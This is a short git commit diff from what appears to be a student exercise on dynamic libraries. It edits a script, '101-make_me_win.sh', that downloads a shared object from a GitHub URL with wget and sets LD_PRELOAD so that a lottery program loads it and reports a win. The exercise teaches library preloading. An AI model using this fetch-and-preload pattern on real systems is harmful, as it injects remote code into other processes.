785e4048ef8b9bbd5b66cfd122a13eb192b1d304
Lance Desk <lncedesk@gmail.com>
2023-10-16 13:13:35 -0700

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
-
-wget -qP /tmp/ https://github.com/lancedesk/alx-low_level_programming/raw/master/0x18-dynamic_libraries/congratulations.so
-export LD_PRELOAD="/tmp/congratulations.so"
+wget -P /tmp/ https://raw.github.com/lancedesk/alx-low_level_programming/master/0x18-dynamic_libraries/congratulations.so
+export LD_PRELOAD=/tmp/congratulations.so
